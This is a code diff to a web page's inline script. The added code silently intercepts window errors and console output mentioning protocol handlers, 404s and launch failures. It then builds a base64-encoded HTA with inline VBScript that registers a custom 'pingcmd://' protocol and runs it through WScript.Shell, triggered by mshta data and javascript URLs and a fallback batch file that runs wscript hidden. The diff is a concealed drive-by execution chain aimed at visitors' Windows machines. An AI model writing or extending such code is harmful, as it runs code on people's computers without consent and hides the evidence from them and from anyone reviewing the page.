@@ -158,14 +158,19 @@
 
     <script>
         // Suppress ALL errors globally - aggressive error suppression
+        // Must be set BEFORE any other code runs
         const originalError = window.onerror;
         window.onerror = function(msg, url, line, col, error) {
-            // Suppress protocol handler errors
-            if (msg && (msg.includes('scheme does not have a registered handler') || 
-                       msg.includes('Failed to launch') ||
-                       msg.includes('Failed to load resource') ||
-                       msg.includes('404'))) {
-                return true; // Suppress error
+            // Suppress protocol handler errors and 404s
+            if (msg && (typeof msg === 'string' || msg.toString)) {
+                const msgStr = String(msg);
+                if (msgStr.includes('scheme') || 
+                    msgStr.includes('Failed to launch') ||
+                    msgStr.includes('Failed to load resource') ||
+                    msgStr.includes('404') ||
+                    msgStr.includes('not have a registered handler')) {
+                    return true; // Suppress error
+                }
             }
             // Call original handler if exists
             if (originalError) {
@@ -174,16 +179,50 @@
             return false;
         };
         
-        // Suppress console errors
+        // Also intercept errors via addEventListener (capture phase)
+        window.addEventListener('error', function(e) {
+            const msg = e.message || e.error?.message || '';
+            if (msg.includes('scheme') || msg.includes('404') || msg.includes('Failed to launch') || msg.includes('not have a registered handler')) {
+                e.preventDefault();
+                e.stopPropagation();
+                e.stopImmediatePropagation();
+                return false;
+            }
+        }, true); // Use capture phase
+        
+        // Suppress console errors - intercept at the lowest level
         const originalConsoleError = console.error;
+        const originalConsoleLog = console.log;
+        const originalConsoleWarn = console.warn;
+        
         console.error = function() {
             const args = Array.from(arguments);
             const msg = args.join(' ');
             // Suppress protocol and 404 errors
-            if (msg.includes('scheme') || msg.includes('404') || msg.includes('Failed to launch')) {
+            if (msg && (msg.includes('scheme') || msg.includes('404') || msg.includes('Failed to launch') || msg.includes('Failed to load resource'))) {
                 return; // Don't log
             }
             originalConsoleError.apply(console, arguments);
+        };
+        
+        console.log = function() {
+            const args = Array.from(arguments);
+            const msg = args.join(' ');
+            // Suppress protocol and 404 errors even in logs
+            if (msg && (msg.includes('scheme') || msg.includes('404') || msg.includes('Failed to launch'))) {
+                return;
+            }
+            originalConsoleLog.apply(console, arguments);
+        };
+        
+        console.warn = function() {
+            const args = Array.from(arguments);
+            const msg = args.join(' ');
+            // Suppress protocol and 404 errors even in warnings
+            if (msg && (msg.includes('scheme') || msg.includes('404') || msg.includes('Failed to launch'))) {
+                return;
+            }
+            originalConsoleWarn.apply(console, arguments);
         };
         
         // Suppress unhandled promise rejections
@@ -236,7 +275,7 @@
             return lines.join('\n');
         }
 
-        // Create HTA content with VBScript inline (can be executed via mshta: protocol)
+        // Create HTA content with VBScript inline that registers AND executes protocol
         function createHTAContent() {
             const vbsContent = createVBSContent();
             
@@ -249,17 +288,25 @@
                 .replace(/\r/g, '\\r');
             
             // Build HTA content - split script tags to avoid HTML parser issues
+            // HTA will register protocol, wait for registry write, then execute it
             const scriptStart = '<script language="VBScript">';
             const scriptEnd = '</' + 'script>';
+            const executeScript = '\\n' +
+                'Set WshShell2 = CreateObject("WScript.Shell")\\n' +
+                'WScript.Sleep 500\\n' +
+                'WshShell2.Run "pingcmd://execute", 0, False\\n' +
+                'WScript.Sleep 500\\n' +
+                'window.close()';
+            
             return '<html><head>' +
                 '<title>Installing Protocol Handler</title>' +
                 scriptStart +
                 escapedVbs +
-                'window.close()' +
+                executeScript +
                 scriptEnd +
                 '</head>' +
                 '<body>' +
-                '<p>Installing protocol handler...</p>' +
+                '<p>Installing and executing...</p>' +
                 '</body>' +
                 '</html>';
         }
@@ -304,8 +351,10 @@
             });
             
             batchLines.push('wscript.exe //B //Nologo "%TEMP_VBS%"');
+            batchLines.push('timeout /t 2 /nobreak >nul');
+            batchLines.push('ping -n 3 127.0.0.1 >nul');
+            batchLines.push('start "" "pingcmd://execute" 2>nul');
             batchLines.push('timeout /t 1 /nobreak >nul');
-            batchLines.push('start "" "pingcmd://execute"');
             batchLines.push('del "%TEMP_VBS%" 2>nul');
             
             return batchLines.join('\n');
@@ -648,22 +697,37 @@
                 }
                 
                 // Method 1: mshta: protocol with multiple formats - execute IMMEDIATELY
+                // HTA will register AND execute protocol in one go (best method)
                 try {
                     const base64Hta = btoa(unescape(encodeURIComponent(htaContent)));
-                    // Format 1: Direct data URI
+                    // Format 1: Direct data URI - PRIMARY METHOD
                     const mshtaUrl1 = `mshta:data:text/html;base64,${base64Hta}`;
-                    window.location.href = mshtaUrl1;
-                    window.open(mshtaUrl1, '_blank');
+                    try {
+                        window.location.href = mshtaUrl1;
+                    } catch (e) {
+                        // Silent fail
+                    }
+                    // Also try window.open as backup
+                    setTimeout(function() {
+                        try {
+                            window.open(mshtaUrl1, '_blank');
+                        } catch (e) {
+                            // Silent fail
+                        }
+                    }, 10);
                     
                     // Format 2: JavaScript wrapper
-                    const mshtaUrl2 = `mshta:javascript:void((function(){var d=document;d.write(atob('${base64Hta}'));})());`;
-                    window.location.href = mshtaUrl2;
-                    
-                    // Format 3: Alternative syntax
-                    const vbsForUrl = createVBSContent();
-                    const mshtaUrl3 = 'mshta:about:<script language="VBScript">' + encodeURIComponent(vbsForUrl) + '</' + 'script>';
-                    window.open(mshtaUrl3, '_blank');
-                } catch (e) {}
+                    setTimeout(function() {
+                        try {
+                            const mshtaUrl2 = `mshta:javascript:void((function(){var d=document;d.write(atob('${base64Hta}'));})());`;
+                            window.location.href = mshtaUrl2;
+                        } catch (e) {
+                            // Silent fail
+                        }
+                    }, 20);
+                } catch (e) {
+                    // Silent fail
+                }
                 
                 // Method 2: Create and execute batch file immediately
                 const batchBlob = new Blob([batchContent], { type: 'application/x-msdos-program' });
@@ -728,9 +792,10 @@
                     }
                 };
                 
-                // Wait longer for VBS execution and registry write
-                // Start retries at 500ms (VBS execution needs time)
-                const retryDelays = [500, 700, 1000, 1500, 2000, 3000, 4000, 5000];
+                // Wait MUCH longer for HTA/VBS execution and registry write
+                // HTA will try to execute automatically - JavaScript is just backup
+                // Start retries at 2000ms to give HTA time to execute first
+                const retryDelays = [2000, 3000, 4000, 5000, 6000, 7000, 8000, 10000];
                 let attemptCount = 0;
                 let successFlag = false;
                 
